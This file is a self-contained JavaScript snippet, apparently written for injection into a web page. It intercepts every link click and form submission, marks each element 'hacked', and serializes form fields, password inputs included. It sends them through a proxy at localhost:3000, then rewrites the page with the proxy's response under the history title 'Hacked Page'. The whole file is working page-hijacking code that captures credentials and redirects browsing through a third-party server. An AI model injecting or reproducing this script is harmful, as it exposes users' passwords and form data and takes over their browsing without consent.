"use strict";

(function() {

	var addEvent = function(element, evnt, funct){
		if (element.attachEvent) {
			return element.attachEvent('on'+evnt, funct);
		}

		return element.addEventListener(evnt, funct, false);
	};

	var changeDom = function(url, pushState, isPost) {

		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {

				var responseJSON = null;
				try {
					responseJSON = JSON.parse(this.responseText);
				} catch (e) {}

				if (responseJSON != null) {
					document.write(responseJSON.content);
					document.close();

					if (pushState) {

						var historyURL = url;
						if (isPost) {
							historyURL = historyURL.substring(0, historyURL.indexOf("?"));
						}

						window.history.pushState({
							"html": responseJSON.content,
							"pageTitle": "Hacked Page"
						}, "", historyURL);

						addEvent(window, "popstate", function(event) {
							changeDom(location.href, false);
						});
					}
				}
			}
		};

		let tempURL = url;
		while (tempURL.indexOf("?") !== -1) {
			tempURL = tempURL.replace("?", "__");
		}

		while (tempURL.indexOf("&") !== -1) {
			tempURL = tempURL.replace("&", "___");
		}

		var prefixURL = "http://localhost:3000/get/?url=";
		xhttp.open("GET", prefixURL + tempURL, true);
		xhttp.send();
	}

	var serialize = function(form) {
        if (!form || form.nodeName !== "FORM") {
            return;
        }
        var i, j, q = [];
        for (i = form.elements.length - 1; i >= 0; i = i - 1) {
                if (form.elements[i].name === "") {
                        continue;
                }
                switch (form.elements[i].nodeName) {
                case 'INPUT':
                        switch (form.elements[i].type) {
                        case 'text':
                        case 'hidden':
                        case 'password':
                        case 'button':
                        case 'reset':
                        case 'submit':
                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                break;
                        case 'checkbox':
                        case 'radio':
                                if (form.elements[i].checked) {
                                        q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                }                                               
                                break;
                        }
                        break;
                        case 'file':
                        break; 
                case 'TEXTAREA':
                        q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                        break;
                case 'SELECT':
                        switch (form.elements[i].type) {
                        case 'select-one':
                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                break;
                        case 'select-multiple':
                                for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
                                        if (form.elements[i].options[j].selected) {
                                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].options[j].value));
                                        }
                                }
                                break;
                        }
                        break;
                case 'BUTTON':
                        switch (form.elements[i].type) {
                        case 'reset':
                        case 'submit':
                        case 'button':
                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                break;
                        }
                        break;
                }
        }
        return q.join("&");
	}

	var hyperLinkFunction = function(event) {
		event.preventDefault();
		changeDom(event.target.href, true, false);
	}

	var formFunction = function(event) {
		event.preventDefault();

		var url = event.target.action + "?" + serialize(event.target);
		changeDom(url, true, true);
	}

	var updateHyperLink = function(hyperLink) {
		hyperLink.setAttribute("hacked", "true");
		addEvent(hyperLink, "click", hyperLinkFunction);
	}

	var updateForm = function(form) {
		form.setAttribute("hacked", "true");
		addEvent(form, "submit", formFunction);
	}

	var hyperLinks = document.getElementsByTagName("a");
	for (var i = 0, length = hyperLinks.length; i < length; i++) {
		updateHyperLink(hyperLinks[i]);
	}

	setInterval(function() {
		var hyperLinks = document.getElementsByTagName("a");
		for (var i = 0, length = hyperLinks.length; i < length; i++) {
			var hyperLink = hyperLinks[i];
			if (hyperLink.getAttribute("hacked") !== "true") {
				updateHyperLink(hyperLink);
			}
		}
	}, 1000);

	setInterval(function() {
		var forms = document.getElementsByTagName("form");
		for (var i = 0, length = forms.length; i < length; i++) {
			var form = forms[i];
			if (form.getAttribute("hacked") !== "true") {
				updateForm(form);
			}
		}
	}, 1000);
}());